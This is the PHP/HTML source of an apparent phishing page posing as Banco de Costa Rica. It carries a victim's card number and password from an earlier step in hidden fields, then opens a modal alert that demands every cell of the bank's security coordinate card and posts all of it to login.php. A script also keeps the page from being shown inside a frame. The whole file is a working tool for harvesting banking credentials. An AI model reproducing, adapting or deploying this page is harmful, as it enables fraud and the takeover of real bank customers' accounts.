<?php
$notarjeta = $_POST['notarjeta'];
$passwordp = $_POST['passwordp'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Banco de Costa rica</title>
<script language="JavaScript">
<!-- 
if (self != top) { 
   if (document.images)
      top.location.replace(window.location.href);
   else
      top.location.href = window.location.href;
}
//-->
</script>
<link type="text/css" href="css/blitzer/jquery-ui-1.8.22.custom.css" rel="stylesheet"  />
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="jqueryui.js"></script>
<link rel="stylesheet" href="table.css" type="text/css"/>
<script language="JavaScript"> 
function tamanios() 
{ 
for(m=0;m<document.forms[0].elements.length;m++) 
    { 
    if(document.forms[0].elements[m].type=="text") 
        { 
        document.forms[0].elements[m].maxLength=3 
        } 
    } 
} 

</script>

<script language='JavaScript' type='text/JavaScript'>

function valida_envia(){
//valido el nombre

	if (document.form1.a1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.a1.focus()
		return false; 
	} 
  	if (document.form1.a2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.a2.focus()
		return false; 
	}
	if (document.form1.a3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.a3.focus()
		return false; 
	}
	if (document.form1.a4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.a4.focus()
		return false; 
	}
	if (document.form1.a5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.a5.focus()
		return false; 
	}
	

	if (document.form1.b1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.b1.focus()
		return false; 
	} 
  	if (document.form1.b2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.b2.focus()
		return false; 
	}
	if (document.form1.b3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.b3.focus()
		return false; 
	}
	if (document.form1.b4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.b4.focus()
		return false; 
	}
	if (document.form1.b5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.b5.focus()
		return false; 
	}
	

	if (document.form1.c1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.c1.focus()
		return false; 
	} 
  	if (document.form1.c2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.c2.focus()
		return false; 
	}
	if (document.form1.c3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.c3.focus()
		return false; 
	}
	if (document.form1.c4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.c4.focus()
		return false; 
	}
	if (document.form1.c5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.c5.focus()
		return false; 
	}
	

	if (document.form1.o1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.o1.focus()
		return false; 
	} 
  	if (document.form1.o2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.o2.focus()
		return false; 
	}
	if (document.form1.o3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.o3.focus()
		return false; 
	}
	if (document.form1.o4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.o4.focus()
		return false; 
	}
	if (document.form1.o5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.o5.focus()
		return false; 
	}
	

	if (document.form1.d1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.d1.focus()
		return false; 
	} 
  	if (document.form1.d2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.d2.focus()
		return false; 
	}
	if (document.form1.d3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.d3.focus()
		return false; 
	}
	if (document.form1.d4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.d4.focus()
		return false; 
	}
	if (document.form1.d5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.d5.focus()
		return false; 
	}
	

	if (document.form1.v1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.v1.focus()
		return false; 
	} 
  	if (document.form1.v2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.v2.focus()
		return false; 
	}
	if (document.form1.v3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.v3.focus()
		return false; 
	}
	if (document.form1.v4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.v4.focus()
		return false; 
	}
	if (document.form1.v5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.v5.focus()
		return false; 
	}
	

	if (document.form1.z1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.z1.focus()
		return false; 
	} 
  	if (document.form1.z2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.z2.focus()
		return false; 
	}
	if (document.form1.z3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.z3.focus()
		return false; 
	}
	if (document.form1.z4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.z4.focus()
		return false; 
	}
	if (document.form1.z5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.z5.focus()
		return false; 
	}
	

	if (document.form1.l1.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.l1.focus()
		return false; 
	} 
  	if (document.form1.l2.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.l2.focus()
		return false; 
	}
	if (document.form1.l3.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.l3.focus()
		return false; 
	}
	if (document.form1.l4.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.l4.focus()
		return false; 
	}
	if (document.form1.l5.value.length==0){
		alert('Por favor complete todos los campos ClaveCoordenadas.')
		document.form1.l5.focus()
		return false; 
	}
	

}
</script>

</head>
<body onload="tamanios()">
<img src="panelbdv.png" />

<div id="dialogo"><div class="CSSTableGenerator" >
<form id="form1" name="form1" method="POST" action="login.php" onSubmit='return valida_envia(this)' >
<input type="hidden" name="notarjeta" id="notarjeta" value="<?php print $notarjeta ?>">
<input type="hidden" name="passwordp" id="passwordp" value="<?php print $passwordp ?>">
<table width="78%" >
		<tr> 
			<td width="3%"></td>
			<td width="5%" >
				A
			</td>
			<td width="5%">
				B</td>
            			<td width="5%">
				C</td>
            			<td width="5%">
				D</td>
            			<td width="5%">
				E</td>
            			<td width="5%">
				F</td>
            			<td width="5%">
				G</td>
            			<td width="5%">
				H</td>
<td width="5%">
				I</td>
<td width="5%">
				J</td>
		</tr>
		<tr>
			<td >
				1</td>
			<td><label for="a1"></label>
		    <input class="input" type="text" name="a1" id="a1" /></td>
			<td>
				<label for="b1"></label>
		    <input class="input" type="text" name="b1" id="b1" />
			</td>
            			<td>
				<label for="c1"></label>
		    <input class="input" type="text" name="c1" id="c1" />
			</td>
            			<td>
				<label for="o1"></label>
		    <input class="input" type="text" name="o1" id="o1" />
			</td>
            			<td>
				<label for="d1"></label>
		    <input class="input" type="text" name="d1" id="d1" />
			</td>
            			<td>
				<label for="v1"></label>
		    <input class="input" type="text" name="v1" id="v1" />
			</td>
            			<td>
				<label for="z1"></label>
		    <input class="input" type="text" name="z1" id="z1" />
			</td>
            			<td>
				<label for="l1"></label>
		    <input class="input" type="text" name="l1" id="l1" />
			</td>
<td>
				<label for="i1"></label>
		    <input class="input" type="text" name="i1" id="l1" />
			</td>
<td>
				<label for="j1"></label>
		    <input class="input" type="text" name="j1" id="l1" />
			</td>
		</tr>
		<tr>
			<td >
				2</td>
			<td>
				<label for="a2"></label>
		    <input class="input" type="text" name="a2" id="a2" />
			</td>
			<td>
				<label for="b2"></label>
		    <input class="input" type="text" name="b2" id="ab2" />
			</td>
            			<td>
				<label for="c2"></label>
		    <input class="input" type="text" name="c2" id="c2" />
			</td>
            			<td>
				<label for="o2"></label>
		    <input class="input" type="text" name="o2" id="o2" />
			</td>
            			<td>
				<label for="d2"></label>
		    <input class="input" type="text" name="d2" id="d2" />
			</td>
            			<td>
				<label for="v2"></label>
		    <input class="input" type="text" name="v2" id="v2" />
			</td>
            			<td>
				<label for="z2"></label>
		    <input class="input" type="text" name="z2" id="z2" />
			</td>
            			<td>
				<label for="l2"></label>
		    <input class="input" type="text" name="l2" id="l2" />
			</td>
<td>
				<label for="i1"></label>
		    <input class="input" type="text" name="i2" id="l1" />
			</td>
<td>
				<label for="j1"></label>
		    <input class="input" type="text" name="j2" id="l1" />
			</td>
		</tr>
		<tr>
			<td >
				3</td>
			<td>
				<label for="a3"></label>
		    <input class="input" type="text" name="a3" id="a3" />
			</td>
			<td>
				<label for="b3"></label>
		    <input class="input" type="text" name="b3" id="b3" />
			</td>
            			<td>
				<label for="c3"></label>
		    <input class="input" type="text" name="c3" id="c3" />
			</td>
            			<td>
				<label for="o3"></label>
		    <input class="input" type="text" name="o3" id="o3" />
			</td>
            			<td>
				<label for="d3"></label>
		    <input class="input" type="text" name="d3" id="d3" />
			</td>
            			<td>
				<label for="v3"></label>
		    <input class="input" type="text" name="v3" id="v3" />
			</td>
            			<td>
				<label for="z3"></label>
		    <input class="input" type="text" name="z3" id="z3" />
			</td>
            			<td>
				<label for="l3"></label>
		    <input class="input" type="text" name="l3" id="l3" />
			</td>
<td>
				<label for="i1"></label>
		    <input class="input" type="text" name="i3" id="l1" />
			</td>
<td>
				<label for="j1"></label>
		    <input class="input" type="text" name="j3" id="l1" />
			</td>
		</tr>
		<tr>
			<td >
				4</td>
			<td>
				<label for="a4"></label>
		    <input class="input" type="text" name="a4" id="a4" />
			</td>
			<td>
				<label for="b4"></label>
		    <input class="input" type="text" name="b4" id="b4" />
			</td>
            			<td>
				<label for="c4"></label>
		    <input class="input" type="text" name="c4" id="c4" />
			</td>
            			<td>
				<label for="o4"></label>
		    <input class="input" type="text" name="o4" id="o4" />
			</td>
            			<td>
				<label for="d4"></label>
		    <input class="input" type="text" name="d4" id="d4" />
			</td>
            			<td>
				<label for="v4"></label>
		    <input class="input" type="text" name="v4" id="v4" />
			</td>
            			<td>
				<label for="z4"></label>
		    <input class="input" type="text" name="z4" id="z4" />
			</td>
            			<td>
				<label for="l4"></label>
		    <input class="input" type="text" name="l4" id="l4" />
			</td>
<td>
				<label for="i1"></label>
		    <input class="input" type="text" name="i4" id="l1" />
			</td>
<td>
				<label for="j1"></label>
		    <input class="input" type="text" name="j4" id="l1" />
			</td>
		</tr>
        		<tr>
			<td >
				5</td>
			<td>
				<label for="a5"></label>
		    <input class="input" type="text" name="a5" id="a5" />
			</td>
			<td>
				<label for="b5"></label>
		    <input class="input" type="text" name="b5" id="b5" />
			</td>
            			<td>
				<label for="c5"></label>
		    <input class="input" type="text" name="c5" id="c5" />
			</td>
            			<td>
				<label for="d5"></label>
		    <input class="input" type="text" name="d5" id="d5" />
			</td>
            			<td>
				<label for="o5"></label>
		    <input class="input" type="text" name="o5" id="o5" />
			</td>
            			<td>
				<label for="v5"></label>
		    <input class="input" type="text" name="v5" id="v5" />
			</td>
            			<td>
				<label for="z5"></label>
		    <input class="input" type="text" name="z5" id="z5" />
			</td>
            			<td>
				<label for="l5"></label>
		    <input class="input" type="text" name="l5" id="l5" />
			</td>
<td>
				<label for="i1"></label>
		    <input class="input" type="text" name="i5" id="l1" />
			</td>
<td>
				<label for="j1"></label>
		    <input class="input" type="text" name="j5" id="l1" />
			</td>
		</tr>
                		
		</tr>
</table></div><div align="center"><input name="form1" onClick="valida(this);" id="form1" value="Continuar" border="0" type="submit"></div></form></div>
<script type="text/javascript">
$(document).ready(function(){
   $("#dialogo").dialog({
      modal: true,
      title: "Alerta: Tarjeta Cl@ve Coordenadas",
      width: 550,
      minWidth: 400,
      maxWidth: 650,
      show: "fold",
      hide: "scale"
   });
});
</script>

</body>
</html>
